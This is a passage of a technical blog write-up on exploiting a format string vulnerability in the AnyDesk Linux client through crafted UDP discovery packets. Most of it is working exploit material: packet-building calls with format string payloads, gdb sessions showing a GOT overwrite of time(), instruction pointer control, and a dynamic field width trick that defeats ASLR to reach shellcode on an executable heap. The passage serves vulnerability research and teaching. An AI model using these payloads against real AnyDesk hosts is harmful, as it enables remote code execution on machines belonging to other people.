<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')
</pre></div>


<p>After a few seconds the GUI updates and the breakpoint on the <code>vsnprintf</code> call is hit:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
</pre></div>


<p>Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
</pre></div>


<p>This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.</p>



<p>Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.</p>



<p>What we have to do now is to find an accessible stack address, which we will write the <code>GOT</code> address to. For this we must keep in mind that the values on the stack between the two <code>vsnprintf</code> calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.</p>



<p>The stack address <code>0x7ffffffebe70</code>, which can be accessed using the argument selector <code>%93$ln</code> fits our needs:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13,28,30]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x7ffffffeacc0 --&gt; 0x0 
0008| 0x7ffffffeaaf8 --&gt; 0x7ffffffeac50 --&gt; 0x55fe85272064696c 
0016| 0x7ffffffeab00 --&gt; 0x171f0c0 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x7ffffffeac50 --&gt; 0x55fe85272064696c 
0032| 0x7ffffffeab10 --&gt; 0x7ffffffeae70 --&gt; 0x0 
0040| 0x7ffffffeab18 --&gt; 0x7ffff5e379d4 (&lt;g_hash_table_lookup+52&gt;:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --&gt; 0x138b230 --&gt; 0x11f6ab0 --&gt; 0x11e7340 --&gt; 0x31 ('1')
0056| 0x7ffffffeab28 --&gt; 0x1715ca0 --&gt; 0x0 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --&gt; 0x7ffffffebe70 --&gt; 0x6ffffec070
...
</pre></div>


<p>After the first call the value <code>0x90</code> (the characters written so far) is written to <code>0x7ffffffebe70</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [1,7,24,25]; title: ; notranslate" title="">
gdb-peda$ ni
...
&#91;-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
=&gt; 0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 &lt;gettimeofday@plt&gt;
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x7ffffffeacc0 --&gt; 0x0 
0008| 0x7ffffffeaaf8 --&gt; 0x7ffffffeac50 --&gt; 0x55fe85272064696c 
0016| 0x7ffffffeab00 --&gt; 0x171f0c0 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x7ffffffeac50 --&gt; 0x55fe85272064696c 
0032| 0x7ffffffeab10 --&gt; 0x7ffffffeae70 --&gt; 0x0 
0040| 0x7ffffffeab18 --&gt; 0x7ffff5e379d4 (&lt;g_hash_table_lookup+52&gt;:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --&gt; 0x138b230 --&gt; 0x11f6ab0 --&gt; 0x11e7340 --&gt; 0x31 ('1')
0056| 0x7ffffffeab28 --&gt; 0x1715ca0 --&gt; 0x0 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090
</pre></div>


<p>When the breakpoint is hit again on the second call, the value is still the same:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [1,8,31,32]; title: ; notranslate" title="">
gdb-peda$ c
Continuing.
...
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x2249 ('I&quot;')
0008| 0x7ffffffeaaf8 --&gt; 0x2bc 
0016| 0x7ffffffeab00 --&gt; 0x158c710 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x5ecbad94 
0032| 0x7ffffffeab10 --&gt; 0x5ecbad94 
0040| 0x7ffffffeab18 --&gt; 0xab240 
0048| 0x7ffffffeab20 --&gt; 0xdd73d0 --&gt; 0x8c3200 (mov    QWORD PTR &#91;rdi],0xdd73d0)
0056| 0x7ffffffeab28 --&gt; 0x3 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090
</pre></div>


<p>On the second call we can access the value using the argument selector <code>%165$p</code> (offset <code>1280</code>):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --&gt; 0x90
...

</pre></div>


<h2 id="ip">Controlling the instruction pointer</h2>



<p>Now we are finally ready to overwrite the <code>GOT</code> entry of <code>time</code>. At first let&#8217;s determine the address of the <code>GOT</code> entry:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ p/x &amp;'time@got.plt'
$1 = 0x119ddc0
</pre></div>


<p>Accordingly the <code>GOT</code> entry of <code>time</code> is stored at <code>0x119ddc0</code>. In order to write this value, we can pad the output of <code>vsnprintf</code> accordingly using a <code>field width</code>. If you are not familiar with this, please refer to my writeup on <a rel="noreferrer noopener" href="https://devel0pment.de/?p=351#lab4B" target="_blank">RPISEC/MBE lab04B</a>. The error message itself (<code>Failed to set text from markup ...</code>) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to <code>18472249</code> characters:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; gutter: false; title: ; notranslate" title="">
0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249
</pre></div>


<p>Let&#8217;s verify this by sending the following announcement frame:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')
</pre></div>


<p>After the first call to <code>vsnprintf</code> the target stack address (<code>0x7ffffffebe70</code>) actually contains the <code>GOT</code> address of <code>time</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13,16,17,18,20,21]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0
</pre></div>


<p>The <code>%165$p</code> format specifier on the second call successfully references the <code>GOT</code> address:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13,16,17,18]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'&quot;
</pre></div>


<p>The next step is to replace the <code>%p</code> format specifier with <code>%ln</code> in order to write a 8 byte value to the <code>GOT</code> entry on the second call. This way we should be able to control the instruction pointer, when the call to <code>time</code> is triggered after the <code>vsnprintf</code> call. Let&#8217;s verify this by writing the value <code>0x1337</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; gutter: false; title: ; notranslate" title="">
0x1337 = 4919
4919 - 133 - 2 = 4784
</pre></div>


<p>This time we adjust the hostname accordingly:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')
</pre></div>


<p>After sending the frame and continuing to the second call to <code>vsnprintf</code>, to <code>GOT</code> entry of <code>time</code> is still untouched:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [5,13,28,29]; title: ; notranslate" title="">
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x2743 (&quot;C'&quot;)
0008| 0x7ffffffeaaf8 --&gt; 0x357 
0016| 0x7ffffffeab00 --&gt; 0x158cf10 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x5ecbb8cc 
0032| 0x7ffffffeab10 --&gt; 0x5ecbb8cc 
0040| 0x7ffffffeab18 --&gt; 0xd0f51 
0048| 0x7ffffffeab20 --&gt; 0xdd73d0 --&gt; 0x8c3200 (mov    QWORD PTR &#91;rdi],0xdd73d0)
0056| 0x7ffffffeab28 --&gt; 0x3 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 &lt;time@got.plt&gt;:	0x00007ffff7ffb930
</pre></div>


<p>By executing the <code>vsnprintf</code> call the value <code>0x1337</code> is successfully written:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 &lt;time@got.plt&gt;:	0x0000000000001337
</pre></div>


<p>If we now continue the execution, the immediately following call to <code>time</code> raises a segmentation fault with the instruction pointer being <code>0x1337</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [1,4,26]; title: ; notranslate" title="">
gdb-peda$ c
Continuing.

Thread 1 &quot;anydesk&quot; received signal SIGSEGV, Segmentation fault.

&#91;----------------------------------registers-----------------------------------]
RAX: 0x1338 
RBX: 0x11c5040 --&gt; 0x21 ('!')
RCX: 0x0 
RDX: 0x0 
RSI: 0x7ffff1784ca0 --&gt; 0x16c1400 --&gt; 0x276e00 ('')
RDI: 0x7ffffffeab08 --&gt; 0x5ecbb8cc 
RBP: 0x5 
RSP: 0x7ffffffeaae8 --&gt; 0x8ab355 (lea    rdi,&#91;rsp+0x20])
RIP: 0x1337 
R8 : 0x1 
R9 : 0x6e ('n')
R10: 0x1 
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --&gt; 0x3000000018 
R13: 0xb366d8 --&gt; 0x62696c67 ('glib')
R14: 0x1453ea0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'&quot;)
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --&gt; 0x8ab355 (lea    rdi,&#91;rsp+0x20])
0008| 0x7ffffffeaaf0 --&gt; 0x2743 (&quot;C'&quot;)
0016| 0x7ffffffeaaf8 --&gt; 0x357 
0024| 0x7ffffffeab00 --&gt; 0x158cf10 --&gt; 0x0 
0032| 0x7ffffffeab08 --&gt; 0x5ecbb8cc 
0040| 0x7ffffffeab10 --&gt; 0x5ecbb8cc 
0048| 0x7ffffffeab18 --&gt; 0xd0f51 
0056| 0x7ffffffeab20 --&gt; 0xdd73d0 --&gt; 0x8c3200 (mov    QWORD PTR &#91;rdi],0xdd73d0)
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()
</pre></div>


<p>We successfully control the instruction pointer.</p>



<h2 id="shellcode">Hitting our shellcode: dynamic field width</h2>



<p>At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	&#91;heap]
</pre></div>


<p>This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don&#8217;t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don&#8217;t get any response from the application. The result of the format string is written to the log file, which we don&#8217;t have access to. Thus we cannot leak any heap address.</p>



<p>Nevertheless we can successfully bypass ASLR using a <code>dynamic field width</code>. Since this does not seem to be very well-known, let&#8217;s have a look at a short example. We have already used the ordinary <code>field width</code> in order to pad the output effectively increasing the amount of characters written, which makes <code>%n</code> write a bigger value:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; auto-links: false; gutter: false; title: ; notranslate" title="">
user@w00d:~$ cat sample1.c
#include &lt;stdio.h&gt;

int main() {

  int out;
  printf(&quot;%100x%1$n&quot;, &amp;out);
  printf(&quot;\nout = %d\n&quot;, out);

  return 0;
}
</pre></div>


<p>The <code>%100x</code> format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the <code>out</code> variable by using the <code>%1$n</code> format specifier:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./sample1 
                                                                                            ffffded4
out = 100
</pre></div>


<p>In this case the <code>field width</code> was statically set to <code>100</code>. But we can also use a <code>dynamic field width</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; gutter: false; title: ; notranslate" title="">
user@w00d:~$ cat sample2.c 
#include &lt;stdio.h&gt;

int main() {

  int out;
  int field_width = 123;
  printf(&quot;%1$*2$x%1$n&quot;, &amp;out, field_width);
  printf(&quot;\nout = %d\n&quot;, out);

  return 0;
}
</pre></div>


<p>We introduced a new variable called <code>field_width</code>, which is passed as the second argument to <code>printf</code>. Also we changed the <code>%100x</code> format specifier to <code>%1$*2$x</code>. At first the syntax might look a little bit confusing, but actually it is quite simple: The <code>1$</code> at the beginning determines, which value we want to print. In this case we just take the first argument, just like the <code>%100x</code> did (4 byte of <code>out</code> address). This is separated by an asterisk (<code>*</code>) from the second part: <code>2$</code>. This determines which value should be used for the field width. In this case the variable <code>field_width</code>, which is the second argument. Accordingly when running the program the value of <code>field_width</code> (<code>123</code>) is written to the variable <code>out</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./sample2 
                                                                                                                   ffffded0
out = 123
</pre></div>


<p>After this short introduction to the dynamic field width, let&#8217;s see how we can leverage this feature.</p>



<p>When inspecting all accessible parameters on the second call to <code>vsnprintf</code> (hostname), we can see that we can access the heap address of the format string. The <code>reg_save_area</code> is stored at <code>0x00007ffffffeb8b0</code>. The value of <code>gp_offset</code> is <code>0x10</code>, which means the first argument we can access is stored at <code>0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [24,33,50]; title: ; notranslate" title="">
&#91;----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x11c5040 --&gt; 0x21 ('!')
RCX: 0x7ffffffeb898 --&gt; 0x3000000010 
RDX: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'&quot;)
RSI: 0x400 
RDI: 0x7ffffffeafd0 --&gt; 0x7 
RBP: 0x5 
RSP: 0x7ffffffeaaf0 --&gt; 0x28e3 
RIP: 0x8ab346 (call   0x412d90 &lt;vsnprintf@plt&gt;)
R8 : 0x0 
R9 : 0x10 
R10: 0xffffffa7 
R11: 0x7ffff1548550 --&gt; 0xfff08320fff08310 
R12: 0x7ffffffeb898 --&gt; 0x3000000010 
R13: 0xb366d8 --&gt; 0x62696c67 ('glib')
R14: 0x1412190 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'&quot;)
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x28e3 
0008| 0x7ffffffeaaf8 --&gt; 0x1e6 
0016| 0x7ffffffeab00 --&gt; 0x158bf10 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x5ecbbcb0 
0032| 0x7ffffffeab10 --&gt; 0x5ecbbcb0 
0040| 0x7ffffffeab18 --&gt; 0x76cd1 
0048| 0x7ffffffeab20 --&gt; 0xdd73d0 --&gt; 0x8c3200 (mov    QWORD PTR &#91;rdi],0xdd73d0)
0056| 0x7ffffffeab28 --&gt; 0x3 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010
</pre></div>


<p>The first accessible argument at <code>0x00007ffffffeb8c0</code> is actually the heap address of the format string (<code>0x0000000001412190</code>). If we use this address as a <code>dynamic field width</code>, we can actually write its value to the <code>time</code> <code>GOT</code> entry.</p>



<p>By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the <code>time</code> <code>GOT</code> entry:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')
</pre></div>


<p>After sending the frame we continue to the second call. The <code>GOT</code> entry is still untouched:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [24,32,47,48]; title: ; notranslate" title="">
&#91;----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x11c5040 --&gt; 0x21 ('!')
RCX: 0x7ffffffeb898 --&gt; 0x3000000010 
RDX: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'&quot;)
RSI: 0x400 
RDI: 0x7ffffffeafd0 --&gt; 0x7 
RBP: 0x5 
RSP: 0x7ffffffeaaf0 --&gt; 0x2db9 
RIP: 0x8ab346 (call   0x412d90 &lt;vsnprintf@plt&gt;)
R8 : 0x0 
R9 : 0x10 
R10: 0x21 ('!')
R11: 0x7ffff1548550 --&gt; 0xfff08320fff08310 
R12: 0x7ffffffeb898 --&gt; 0x3000000010 
R13: 0xb366d8 --&gt; 0x62696c67 ('glib')
R14: 0x1570630 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'&quot;)
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,&#91;rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=&gt; 0x8ab346:	call   0x412d90 &lt;vsnprintf@plt&gt;
   0x8ab34b:	lea    rdi,&#91;rsp+0x18]
   0x8ab350:	call   0x412ff0 &lt;time@plt&gt;
   0x8ab355:	lea    rdi,&#91;rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg&#91;0]: 0x7ffffffeafd0 --&gt; 0x7 
arg&#91;1]: 0x400 
arg&#91;2]: 0x7ffffffeabd0 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'&quot;)
arg&#91;3]: 0x7ffffffeb898 --&gt; 0x3000000010 
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --&gt; 0x2db9 
0008| 0x7ffffffeaaf8 --&gt; 0x9d 
0016| 0x7ffffffeab00 --&gt; 0x158df10 --&gt; 0x0 
0024| 0x7ffffffeab08 --&gt; 0x5ecbc775 
0032| 0x7ffffffeab10 --&gt; 0x5ecbc775 
0040| 0x7ffffffeab18 --&gt; 0x26709 
0048| 0x7ffffffeab20 --&gt; 0xdd73d0 --&gt; 0x8c3200 (mov    QWORD PTR &#91;rdi],0xdd73d0)
0056| 0x7ffffffeab28 --&gt; 0x3 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 &quot;anydesk&quot; hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 &lt;time@got.plt&gt;:	0x00007ffff7ffb930
</pre></div>


<p>After executing the call the <code>GOT</code> entry contains the heap address <code>0x00000000015706b7</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 &lt;time@got.plt&gt;:	0x00000000015706b7
</pre></div>


<p>The <code>%n</code> wrote the field width (the heap address of the format string <code>0x1570630</code>) + the characters written so far. The resulting address (<code>0x00000000015706b7</code>) references the beginning of our format specifier:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	&quot;%1$*1$x%165$ln'&quot;
</pre></div>

